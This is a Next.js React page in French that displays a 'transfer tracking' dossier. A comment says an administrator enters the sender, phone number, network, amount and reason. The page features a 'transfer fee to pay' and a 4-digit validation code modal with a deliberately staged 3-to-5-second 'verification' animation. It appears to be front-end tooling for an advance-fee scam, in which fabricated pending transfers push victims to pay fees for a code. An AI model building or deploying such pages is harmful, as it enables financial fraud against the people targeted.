"use client";
import { useEffect, useState, useRef } from "react";
import { useParams } from "next/navigation";
import {
  ShieldCheck, XCircle, CheckCircle2, Loader2, Lock, RefreshCw, X,
} from "lucide-react";
import { Button, Modal, fmt } from "@/components/UI";

export default function DossierPage() {
  const { id } = useParams();
  const [link, setLink] = useState(null);
  const [notFound, setNotFound] = useState(false);
  const [showCode, setShowCode] = useState(false);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      const res = await fetch(`/api/links/${id}`, { cache: "no-store" });
      if (cancelled) return;
      if (!res.ok) { setNotFound(true); return; }
      const data = await res.json();
      setLink(data.link);
    })();
    return () => { cancelled = true; };
  }, [id]);

  if (notFound) {
    return (
      <Centered>
        <XCircle size={40} color="#BE4141" />
        <h2 className="font-display text-brand-ink mt-4 mb-1.5">Lien introuvable</h2>
        <p className="text-brand-inkSoft text-sm">Ce lien de dossier n'existe pas ou a été supprimé.</p>
      </Centered>
    );
  }
  if (!link) {
    return (
      <Centered>
        <Loader2 size={26} className="spin text-brand-teal" />
      </Centered>
    );
  }

  return (
    <div className="min-h-screen px-5 py-12" style={{ background: "linear-gradient(180deg,#EFEAE0,#F6F3EC 340px)" }}>
      <div className="max-w-[480px] mx-auto">
        <div className="text-center mb-5.5 reveal">
          <div className="w-[46px] h-[46px] rounded-[13px] bg-brand-tealDeep mx-auto mb-3 flex items-center justify-center">
            <ShieldCheck size={22} color="#fff" />
          </div>
          <p className="text-[12.5px] tracking-wide uppercase text-brand-inkFaint font-semibold">Suivi de transfert</p>
        </div>

        <div className="bg-white rounded-[20px] border border-brand-line overflow-hidden shadow-[0_20px_50px_rgba(27,33,48,0.1)] reveal" style={{ animationDelay: "80ms" }}>
          <div className="px-7 py-6 border-b border-dashed border-brand-line flex justify-between items-start gap-3 flex-wrap">
            <div>
              <p className="text-xs text-brand-inkFaint uppercase tracking-wide font-semibold mb-1">Transfert de</p>
              <h2 className="font-display text-[21px] text-brand-ink">{link.prenom} {link.nom}</h2>
              <p className="font-mono text-xs text-brand-inkFaint mt-1">Réf. {link.id}</p>
            </div>
            <span
              className="text-[11.5px] font-bold px-3 py-1.5 rounded-full whitespace-nowrap"
              style={{ background: link.validated ? "#E4EFEC" : "#F4EBD8", color: link.validated ? "#1E7A52" : "#B8873A" }}
            >
              {link.validated ? "VALIDÉ" : "EN COURS"}
            </span>
          </div>

          <div className="px-7 py-6">
            {/* Toutes les informations renseignées par l'administrateur */}
            <Row label="Prénom" value={link.prenom} />
            <Row label="Nom" value={link.nom} />
            <Row label="Numéro" value={link.numero} mono />
            <Row label="Réseau" value={link.reseau} />
            <Row label="Montant envoyer" value={`${fmt(link.montantTotal)} FCFA`} mono />
            <div className="h-px bg-brand-line my-4" />

            <div className="mb-4">
              <p className="text-[11.5px] text-brand-tealDeep font-bold uppercase tracking-wide mb-1">Montant</p>
              <p className="font-mono text-[26px] font-semibold text-brand-tealDeep">{fmt(link.montant)} FCFA</p>
            </div>

            <div>
              <p className="text-xs text-brand-inkFaint font-semibold uppercase tracking-wide mb-1">Motif</p>
              <p className="text-[14.5px] text-brand-ink leading-relaxed">{link.motif}</p>
            </div>
          </div>

          {/* Frais de dossier à payer, mis en avant sans cadre pour rester lisible */}
          <div className="px-7 py-5 border-t border-brand-line flex items-center justify-between gap-3 flex-wrap">
            <p className="text-[12.5px] text-brand-gold font-bold uppercase tracking-wide">Frais de transfert à payer</p>
            <p className="font-mono text-xl font-bold text-brand-gold">{fmt(link.fraisDossier)} FCFA</p>
          </div>

          <div className="px-7 py-7">
            {link.validated ? (
              <div className="flex items-center justify-center gap-2 py-3.5 bg-brand-tealSoft rounded-xl text-brand-success font-bold text-[14.5px]">
                <CheckCircle2 size={18} /> transfert validé
              </div>
            ) : (
              <Button variant="gold" className="w-full py-3.5" onClick={() => setShowCode(true)}>
                <ShieldCheck size={17} /> Valider mon transfert
              </Button>
            )}
          </div>
        </div>

        <p className="text-center text-xs text-brand-inkFaint mt-4.5">
           Transfert suivi généré automatiquement — conservez ce lien.
        </p>
      </div>

      {showCode && (
        <CodeModal
          linkId={link.id}
          onClose={() => setShowCode(false)}
          onValidated={(updated) => { setLink(updated); setShowCode(false); }}
        />
      )}
    </div>
  );
}

function Row({ label, value, mono }) {
  return (
    <div className="flex justify-between items-start gap-4 py-2.5">
      <span className="text-[13px] text-brand-inkFaint shrink-0">{label}</span>
      <span className={`text-[15px] text-brand-ink font-semibold text-right break-words ${mono ? "font-mono" : ""}`}>{value}</span>
    </div>
  );
}

function Centered({ children }) {
  return (
    <div className="min-h-screen bg-brand-bg flex flex-col items-center justify-center p-5 text-center">
      {children}
    </div>
  );
}

function CodeModal({ linkId, onClose, onValidated }) {
  const [digits, setDigits] = useState(["", "", "", ""]);
  const [stage, setStage] = useState("input");
  const refs = [useRef(), useRef(), useRef(), useRef()];

  useEffect(() => { refs[0].current?.focus(); }, []);

  const handleChange = (i, val) => {
    const v = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = v;
    setDigits(next);
    if (v && i < 3) refs[i + 1].current?.focus();
    if (v && i === 3 && next.every((d) => d)) submit(next.join(""));
  };

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) refs[i - 1].current?.focus();
  };

  const submit = async (code) => {
    setStage("checking");
    const start = Date.now();
    const res = await fetch(`/api/links/${linkId}/validate`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code }),
    });
    const data = await res.json();
    // Anime au moins 3 à 5 secondes avant d'afficher le résultat
    const elapsed = Date.now() - start;
    const minDelay = 3000 + Math.random() * 2000;
    if (elapsed < minDelay) await new Promise((r) => setTimeout(r, minDelay - elapsed));

    if (res.ok && data.ok) {
      setStage("success");
      setTimeout(() => onValidated(data.link), 1400);
    } else {
      setStage("error");
    }
  };

  const retry = () => {
    setDigits(["", "", "", ""]);
    setStage("input");
    setTimeout(() => refs[0].current?.focus(), 50);
  };

  return (
    <Modal maxWidth={400}>
      <div className="text-center relative">
        {stage === "input" && (
          <>
            <X size={18} className="absolute -top-2 -right-2 cursor-pointer text-brand-inkFaint" onClick={onClose} />
            <div className="w-[60px] h-[60px] rounded-full bg-brand-goldSoft mx-auto mb-4 mt-1 flex items-center justify-center">
              <Lock size={26} color="#B8873A" />
            </div>
            <h3 className="font-display text-brand-ink mb-1.5 text-[19px]">Code de vérification</h3>
            <p className="text-brand-inkSoft text-[13.5px] mb-5.5">Entrez le code à 4 chiffres communiqué pour ce dossier.</p>
            <div className="flex gap-3 justify-center mb-5.5">
              {digits.map((d, i) => (
                <input
                  key={i} ref={refs[i]} value={d} inputMode="numeric" maxLength={1}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  className="w-[52px] h-[60px] text-center text-2xl font-bold font-mono rounded-xl border-2 border-brand-line outline-none text-brand-ink bg-brand-bg focus:border-brand-gold"
                />
              ))}
            </div>
            <Button variant="gold" className="w-full" disabled={!digits.every((d) => d)} onClick={() => submit(digits.join(""))}>
              Vérifier le code
            </Button>
          </>
        )}

        {stage === "checking" && (
          <div className="py-4.5">
            <div className="relative w-[90px] h-[90px] mx-auto mb-5.5">
              <div className="absolute inset-0 rounded-full border-4 border-brand-goldSoft spin-slow" style={{ borderTopColor: "#B8873A" }} />
              <div className="absolute inset-0 flex items-center justify-center">
                <ShieldCheck size={30} color="#B8873A" />
              </div>
            </div>
            <h3 className="font-display text-brand-ink mb-1.5 text-[17px]">Vérification en cours…</h3>
            <p className="text-brand-inkSoft text-[13.5px]">Nous confirmons votre code auprès du dossier.</p>
          </div>
        )}

        {stage === "success" && (
          <div className="py-2.5">
            <div className="w-24 h-24 mx-auto mb-5 relative animate-popIn">
              <svg width="96" height="96" viewBox="0 0 96 96">
                <circle cx="48" cy="48" r="42" fill="none" stroke="#1E7A52" strokeWidth="4" className="seal-ring" />
                <path d="M30 50 L43 63 L67 35" fill="none" stroke="#1E7A52" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" className="seal-check" />
              </svg>
            </div>
            <h3 className="font-display text-brand-success mb-1.5 text-[19px]">Dossier validé !</h3>
            <p className="text-brand-inkSoft text-[13.5px]">Le code a été confirmé avec succès.</p>
          </div>
        )}

        {stage === "error" && (
          <div className="py-1.5">
            <div className="w-[66px] h-[66px] rounded-full bg-brand-dangerSoft mx-auto mb-4.5 flex items-center justify-center animate-shake">
              <XCircle size={30} color="#BE4141" />
            </div>
            <h3 className="font-display text-brand-danger mb-1.5 text-[18px]">Code erroné</h3>
            <p className="text-brand-inkSoft text-[13.5px] mb-5">Le code saisi ne correspond pas à ce dossier.</p>
            <Button variant="danger" className="w-full" onClick={retry}>
              <RefreshCw size={15} /> Réessayer
            </Button>
          </div>
        )}
      </div>
    </Modal>
  );
}
